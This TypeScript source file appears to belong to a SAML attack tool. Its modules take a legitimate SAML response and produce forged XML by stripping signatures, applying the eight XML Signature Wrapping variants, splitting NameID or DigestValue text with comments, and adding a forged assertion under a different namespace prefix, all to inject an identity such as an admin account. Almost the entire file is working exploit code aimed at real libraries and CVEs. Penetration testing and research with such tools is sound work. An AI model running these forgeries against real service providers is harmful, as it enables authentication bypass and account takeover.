import {
  type El,
  NS,
  parseDoc,
  serialize,
  localName,
  elementsByLocal,
  firstByLocal,
  insertBeforeSibling,
  removeNode,
  setText,
  setAttr,
  getAttr,
  newId,
} from '../dom';
import type { AttackModule, AttackParams, AttackResult, GenerateContext } from './types';

/* ------------------------------------------------------------------ shared */

const P_NAMEID = {
  key: 'nameId' as const,
  label: 'Inject NameID',
  placeholder: 'admin@example.com',
  default: 'admin@example.com',
  help: 'The identity a vulnerable SP should end up authenticating as.',
};

const P_COMMENT_TAIL = {
  key: 'commentTail' as const,
  label: 'Suffix you actually control',
  placeholder: '.attacker.example',
  default: '.attacker.example',
  help: 'Text placed after the comment. A strict parser reads only the part before it.',
};

function context(root: El): GenerateContext {
  const assertions = elementsByLocal(root, 'Assertion');
  const hadSignature = elementsByLocal(root, 'Signature').length > 0;
  const notes: string[] = [];
  if (!hadSignature) notes.push('The source has no signature, so a real signature cannot be preserved — treat the output as a structural template.');
  if (assertions.length === 0) notes.push('No <saml:Assertion> was found in the source.');
  return { hadSignature, assertionCount: assertions.length, notes };
}

/** The assertion carrying a signature (the one we must leave byte-for-byte intact), else the first. */
function signedAssertion(root: El): El | null {
  const assertions = elementsByLocal(root, 'Assertion');
  for (const a of assertions) {
    if (elementsByLocal(a, 'Signature').length > 0) return a;
  }
  return assertions[0] || null;
}

function stripSignatures(el: El): void {
  for (const sig of elementsByLocal(el, 'Signature')) removeNode(sig);
}

function setNameIds(el: El, value: string): void {
  for (const n of elementsByLocal(el, 'NameID')) setText(n, value);
}

function fail(root: El | null, xml: string, message: string): AttackResult {
  return {
    ok: false,
    maliciousXML: '',
    error: message,
    explanation: '',
    whyItWorks: '',
    context: root ? context(root) : { hadSignature: false, assertionCount: 0, notes: [] },
  };
}

function guard(legitXML: string): { root: El | null; error: string | null } {
  const { root, error } = parseDoc(legitXML);
  if (!root) return { root: null, error: error || 'Could not read the input as XML.' };
  return { root, error: null };
}

/* ------------------------------------------------------------ the modules */

const signatureExclusion: AttackModule = {
  id: 'sig-exclusion',
  name: 'Signature exclusion',
  tagline: 'Remove the signature entirely',
  category: 'exclusion',
  description:
    'Strips every <ds:Signature> from the document and sets the NameID to your chosen identity. The simplest attack, and still one of the most effective against misconfigured SPs.',
  affectedParsers: ['SPs that treat the signature as optional', 'SPs that only verify a signature if one is present'],
  relatedCVEs: ['CVE-2023-22551', 'CVE-2022-23517'],
  params: [P_NAMEID],
  generate(legitXML, params) {
    const { root, error } = guard(legitXML);
    if (!root) return fail(null, legitXML, error!);
    const ctx = context(root);
    stripSignatures(root);
    if (params.nameId) setNameIds(root, params.nameId);
    return {
      ok: true,
      maliciousXML: serialize(root),
      explanation: `Removed all <ds:Signature> elements${params.nameId ? ` and set every NameID to ${params.nameId}` : ''}. The document now carries no cryptographic protection at all.`,
      whyItWorks:
        'Succeeds against a Service Provider that accepts an unsigned assertion — either because signature verification is disabled, is only run "if a signature is present", or is enforced on the Response but not the Assertion (or vice versa).',
      context: ctx,
    };
  },
};

/**
 * The eight XML Signature Wrapping variants exactly as catalogued in the paper
 * "On Breaking SAML: Be Whoever You Want to Be" and implemented in SAML Raider's
 * XSWHelpers. XSW1–2 target a signature on the <Response>; XSW3–8 target a
 * signature on the first <Assertion>. The element that receives the injected
 * identity is the same one SAML Raider applies its match-and-replace to, and the
 * clean copy that the signature reference resolves to is always taken before the
 * injection, so a genuine signature stays valid where the variant relies on it.
 */
type XswResult = { ok: true; notes: string[] } | { ok: false; error: string; notes: string[] };

function firstAssertionIn(root: El): El | null {
  return firstByLocal(root, 'Assertion');
}
function firstResponseIn(root: El): El | null {
  return localName(root) === 'Response' ? root : firstByLocal(root, 'Response');
}
function insideAssertion(el: El): boolean {
  let p = el.parentNode;
  while (p) {
    if (p.nodeType === 1 && localName(p) === 'Assertion') return true;
    p = p.parentNode;
  }
  return false;
}
function injectEvil(el: El, nameId?: string) {
  if (nameId) setNameIds(el, nameId);
}

function applyXsw(root: El, n: number, nameId?: string): XswResult {
  const err = (error: string): XswResult => ({ ok: false, error, notes: [] });
  const ok = (notes: string[] = []): XswResult => ({ ok: true, notes });
  const doc = root.ownerDocument;

  switch (n) {
    case 1:
    case 2: {
      const response = firstResponseIn(root);
      if (!response) return err('XSW1/XSW2 target a signature on the <Response>, but no <Response> element was found.');
      const signature = firstByLocal(response, 'Signature');
      if (!signature) return err('No <ds:Signature> was found to wrap.');
      const clonedResponse = response.cloneNode(true);
      injectEvil(response, nameId);
      const clonedSig = firstByLocal(clonedResponse, 'Signature');
      if (clonedSig) removeNode(clonedSig);
      if (n === 1) signature.appendChild(clonedResponse);
      else signature.parentNode.insertBefore(clonedResponse, signature);
      setAttr(response, 'ID', '_evil_response_ID');
      return ok(
        insideAssertion(signature)
          ? ['XSW1/XSW2 model a Response-level signature; this document’s signature sits inside an Assertion, so XSW3–XSW8 usually fit better.']
          : [],
      );
    }
    case 3:
    case 4: {
      const assertion = firstAssertionIn(root);
      if (!assertion) return err('XSW3/XSW4 need at least one <saml:Assertion>.');
      const evil = assertion.cloneNode(true);
      injectEvil(evil, nameId);
      const copiedSig = firstByLocal(evil, 'Signature');
      if (!copiedSig) return err('XSW3/XSW4 need the first <Assertion> to carry a <ds:Signature>.');
      setAttr(evil, 'ID', '_evil_assertion_ID');
      removeNode(copiedSig);
      if (n === 3) {
        (assertion.parentNode || root).insertBefore(evil, assertion);
      } else {
        root.appendChild(evil);
        evil.appendChild(assertion);
      }
      return ok();
    }
    case 5:
    case 6: {
      const evilAssertion = firstAssertionIn(root);
      if (!evilAssertion) return err('XSW5/XSW6 need at least one <saml:Assertion>.');
      const originalSignature = firstByLocal(evilAssertion, 'Signature');
      if (!originalSignature) return err('XSW5/XSW6 need the first <Assertion> to carry a <ds:Signature>.');
      const clean = evilAssertion.cloneNode(true);
      injectEvil(evilAssertion, nameId);
      const cleanSig = firstByLocal(clean, 'Signature');
      if (cleanSig) removeNode(cleanSig);
      if (n === 5) root.appendChild(clean);
      else originalSignature.appendChild(clean);
      setAttr(evilAssertion, 'ID', '_evil_assertion_ID');
      return ok();
    }
    case 7: {
      const assertion = firstAssertionIn(root);
      if (!assertion) return err('XSW7 needs at least one <saml:Assertion>.');
      const extensions = doc.createElement('Extensions');
      (assertion.parentNode || root).insertBefore(extensions, assertion);
      const evil = assertion.cloneNode(true);
      injectEvil(evil, nameId);
      const copiedSig = firstByLocal(evil, 'Signature');
      if (!copiedSig) {
        removeNode(extensions);
        return err('XSW7 needs the first <Assertion> to carry a <ds:Signature>.');
      }
      removeNode(copiedSig);
      extensions.appendChild(evil);
      return ok();
    }
    case 8: {
      const evilAssertion = firstAssertionIn(root);
      if (!evilAssertion) return err('XSW8 needs at least one <saml:Assertion>.');
      const originalSignature = firstByLocal(evilAssertion, 'Signature');
      if (!originalSignature) return err('XSW8 needs the first <Assertion> to carry a <ds:Signature>.');
      const clean = evilAssertion.cloneNode(true);
      injectEvil(evilAssertion, nameId);
      const cleanSig = firstByLocal(clean, 'Signature');
      if (cleanSig) removeNode(cleanSig);
      const object = doc.createElement('Object');
      originalSignature.appendChild(object);
      object.appendChild(clean);
      return ok();
    }
    default:
      return err(`Unknown XSW variant ${n}.`);
  }
}

interface XswMeta {
  tagline: string;
  description: string;
  whyItWorks: string;
}

const XSW_META: Record<number, XswMeta> = {
  1: {
    tagline: 'Response signature · clean clone inside the Signature',
    description:
      'Targets a signature on the <Response>. Clones the Response, injects your identity into the original, renames the original to ID "_evil_response_ID", and nests a signature-stripped clean clone (keeping the original ID) inside the original Signature.',
    whyItWorks:
      'Works against an SP that resolves the signed reference to the copy nested inside the Signature, but reads its assertion from the outer, renamed Response.',
  },
  2: {
    tagline: 'Response signature · clean clone before the Signature',
    description:
      'As XSW1, but the signature-stripped clean clone is inserted as a sibling immediately before the original Signature rather than inside it. The original Response is renamed and carries your identity.',
    whyItWorks:
      'Works against an SP whose reference resolution finds the clean sibling copy while its identity logic reads the renamed outer Response.',
  },
  3: {
    tagline: 'Evil assertion before the signed one',
    description:
      'Targets a signature on the <Assertion>. Inserts a signature-stripped clone (ID "_evil_assertion_ID", your identity) immediately before the genuine signed assertion, which is left untouched.',
    whyItWorks:
      'Works against an SP that verifies the signed assertion but extracts identity from the first assertion it encounters.',
  },
  4: {
    tagline: 'Signed assertion nested inside the forgery',
    description:
      'Appends a signature-stripped clone (ID "_evil_assertion_ID", your identity) to the document root, then nests the genuine signed assertion inside that clone.',
    whyItWorks:
      'Works against an SP whose signature check locates the signed assertion by ID but whose identity extraction reads the enclosing forged assertion.',
  },
  5: {
    tagline: 'Original keeps its signature, ID swapped to evil',
    description:
      'Injects your identity into the original assertion and renames it to "_evil_assertion_ID" — it keeps its Signature. A clean, signature-stripped copy that retains the original ID is appended to the root, so the reference resolves to that copy.',
    whyItWorks:
      'Works against an SP that validates the signature against the clean copy (matched by the original ID) but reads identity from the renamed original assertion.',
  },
  6: {
    tagline: 'Clean copy hidden inside the Signature',
    description:
      'Like XSW5, but the clean signature-stripped copy is nested inside the original assertion’s own Signature element rather than appended at the root. The original assertion is renamed and carries your identity.',
    whyItWorks:
      'Works against an SP that resolves the reference to the copy nested in the Signature while reading identity from the enclosing renamed assertion.',
  },
  7: {
    tagline: 'Forgery inside an <Extensions> wrapper',
    description:
      'Wraps a signature-stripped clone (deliberately keeping the original ID — a duplicate) in a new <Extensions> element placed before the genuine assertion.',
    whyItWorks:
      'Works against a library with a permissive getElementById/XPath that returns the Extensions-wrapped duplicate for identity while the genuine assertion still satisfies the signature.',
  },
  8: {
    tagline: 'Clean copy inside a <ds:Object>',
    description:
      'Injects your identity into the original assertion (kept in place with its Signature and ID) and tucks a clean, signature-stripped copy — same ID — inside a new <Object> element under that Signature.',
    whyItWorks:
      'Works against an SP that resolves the signed reference to the copy inside the ds:Object while reading identity from the outer, modified assertion.',
  },
};

function xswModule(n: number): AttackModule {
  const meta = XSW_META[n];
  return {
    id: `xsw${n}`,
    name: `XSW${n}`,
    tagline: meta.tagline,
    category: 'wrapping',
    description: meta.description,
    affectedParsers:
      n <= 2
        ? ['SPs verifying a Response-level signature', 'OpenSAML (historic)', 'Shibboleth (historic)']
        : ['ruby-saml', 'python3-saml / OneLogin', 'OpenSAML (historic)', 'Shibboleth (historic)'],
    relatedCVEs: ['CVE-2017-11427', 'CVE-2018-0489', 'CVE-2025-25291'],
    params: [P_NAMEID],
    generate(legitXML, params) {
      const { root, error } = guard(legitXML);
      if (!root) return fail(null, legitXML, error!);
      const ctx = context(root);
      const res = applyXsw(root, n, params.nameId);
      if (!res.ok) return fail(root, legitXML, res.error);
      ctx.notes.push(...res.notes);
      return {
        ok: true,
        maliciousXML: serialize(root),
        explanation: `${meta.description}${params.nameId ? ` Forged identity: ${params.nameId}.` : ''}`,
        whyItWorks: meta.whyItWorks,
        context: ctx,
      };
    },
  };
}

const commentNameId: AttackModule = {
  id: 'comment-nameid',
  name: 'Comment injection (NameID)',
  tagline: 'Split the NameID with an XML comment',
  category: 'comment',
  description:
    'Rewrites the NameID as `value<!---->suffix`. Canonicalization that ignores comments concatenates the two text runs, so a signature over `value+suffix` stays valid — but a parser that reads only the first text node sees `value`.',
  affectedParsers: ['ruby-saml', 'python-saml (Duo Labs, 2018)', 'OmniAuth-SAML', 'Shibboleth'],
  relatedCVEs: ['CVE-2018-0489', 'CVE-2017-11428', 'CVE-2018-1000164'],
  params: [P_NAMEID, P_COMMENT_TAIL],
  generate(legitXML, params) {
    const { root, error } = guard(legitXML);
    if (!root) return fail(null, legitXML, error!);
    const ctx = context(root);
    const target = signedAssertion(root) || root;
    const nameEl = firstByLocal(target, 'NameID');
    if (!nameEl) return fail(root, legitXML, 'No <saml:NameID> found to inject a comment into.');

    const head = params.nameId || 'admin@example.com';
    const tail = params.commentTail ?? '.attacker.example';
    const doc = root.ownerDocument;
    while (nameEl.firstChild) nameEl.removeChild(nameEl.firstChild);
    nameEl.appendChild(doc.createTextNode(head));
    nameEl.appendChild(doc.createComment(''));
    nameEl.appendChild(doc.createTextNode(tail));

    return {
      ok: true,
      maliciousXML: serialize(root),
      explanation: `Set the NameID to "${head}<!---->${tail}". A strict, first-text-node parser reads "${head}"; a concatenating parser reads "${head}${tail}".`,
      whyItWorks:
        `Succeeds only if the genuinely-signed NameID was exactly "${head}${tail}" AND the SP canonicalizes with comments removed (so the digest is unchanged) AND its identity code takes the first text node. In other words, you sign a value you legitimately own ("${head}${tail}") and trick a strict parser into reading a prefix of it ("${head}").`,
      context: ctx,
    };
  },
};

const commentDigest: AttackModule = {
  id: 'comment-digest',
  name: 'Comment injection (DigestValue)',
  tagline: 'Split the DigestValue with a comment',
  category: 'comment',
  description:
    'Inserts an XML comment into the DigestValue text. Probes verifiers whose text accessor for the digest disagrees with the canonicalizer about how comments split character data.',
  affectedParsers: ['Verifiers using nodeValue/firstChild for DigestValue', 'Some XML-DSig libraries with lenient text handling'],
  relatedCVEs: ['CVE-2017-11428'],
  params: [],
  generate(legitXML) {
    const { root, error } = guard(legitXML);
    if (!root) return fail(null, legitXML, error!);
    const ctx = context(root);
    const digest = firstByLocal(root, 'DigestValue');
    if (!digest) return fail(root, legitXML, 'No <ds:DigestValue> found. This attack needs a signed document.');
    const text = (digest.textContent || '').trim();
    if (text.length < 2) return fail(root, legitXML, 'The DigestValue is too short to split.');

    const mid = Math.floor(text.length / 2);
    const doc = root.ownerDocument;
    while (digest.firstChild) digest.removeChild(digest.firstChild);
    digest.appendChild(doc.createTextNode(text.slice(0, mid)));
    digest.appendChild(doc.createComment(''));
    digest.appendChild(doc.createTextNode(text.slice(mid)));

    return {
      ok: true,
      maliciousXML: serialize(root),
      explanation: `Split the DigestValue as "${text.slice(0, mid)}<!---->${text.slice(mid)}". The concatenated text is unchanged.`,
      whyItWorks:
        'Succeeds against a verifier whose DigestValue accessor mishandles comment-split character data — reading only one run, or concatenating differently than the canonicalizer — so the recomputed and provided digests are compared incorrectly.',
      context: ctx,
    };
  },
};

const namespaceForgery: AttackModule = {
  id: 'namespace',
  name: 'Namespace / prefix forgery',
  tagline: 'Same URI, different prefix',
  category: 'namespace',
  description:
    'Builds a forged assertion whose elements use a different namespace prefix (saml2:) bound to the same SAML URI, and places it beside the signed original. Probes SPs that match elements by literal prefix rather than resolved namespace URI.',
  affectedParsers: ['XPath selectors keyed on a literal prefix (//saml:Assertion)', 'String-based element matching'],
  relatedCVEs: ['CVE-2016-1000253'],
  params: [P_NAMEID],
  generate(legitXML, params) {
    const { root, error } = guard(legitXML);
    if (!root) return fail(null, legitXML, error!);
    const ctx = context(root);
    const original = signedAssertion(root);
    if (!original || !original.parentNode) return fail(root, legitXML, 'No assertion (with a parent) to sit beside.');

    const doc = root.ownerDocument;
    const P = 'saml2';
    const mk = (name: string): El => doc.createElementNS(NS.assertion, `${P}:${name}`);
    const forged = mk('Assertion');
    setAttr(forged, 'ID', newId('_forged'));
    setAttr(forged, 'Version', '2.0');
    setAttr(forged, 'IssueInstant', getAttr(original, 'IssueInstant') || '2026-01-01T00:00:00Z');

    const issuer = mk('Issuer');
    issuer.appendChild(doc.createTextNode((firstByLocal(original, 'Issuer')?.textContent || 'https://idp.example.com/metadata').trim()));
    const subject = mk('Subject');
    const nameId = mk('NameID');
    nameId.appendChild(doc.createTextNode(params.nameId || 'admin@example.com'));
    subject.appendChild(nameId);

    forged.appendChild(doc.createTextNode('\n  '));
    forged.appendChild(issuer);
    forged.appendChild(doc.createTextNode('\n  '));
    forged.appendChild(subject);
    forged.appendChild(doc.createTextNode('\n'));

    insertBeforeSibling(forged, original);

    return {
      ok: true,
      maliciousXML: serialize(root),
      explanation: `Inserted a forged <${P}:Assertion> (identity ${params.nameId || 'admin@example.com'}) bound to the SAML assertion URI under the prefix "${P}:", beside the genuine <saml:Assertion>.`,
      whyItWorks:
        'Succeeds against an SP that selects assertions by a hard-coded prefix (for example an XPath like //saml:Assertion) instead of by namespace URI: it verifies the signed saml:Assertion but its business logic also — or instead — reads the saml2:Assertion it failed to account for.',
      context: ctx,
    };
  },
};

export const ATTACKS: AttackModule[] = [
  xswModule(1),
  xswModule(2),
  xswModule(3),
  xswModule(4),
  xswModule(5),
  xswModule(6),
  xswModule(7),
  xswModule(8),
  signatureExclusion,
  commentNameId,
  commentDigest,
  namespaceForgery,
];

export function getAttack(id: string): AttackModule | undefined {
  return ATTACKS.find((a) => a.id === id);
}
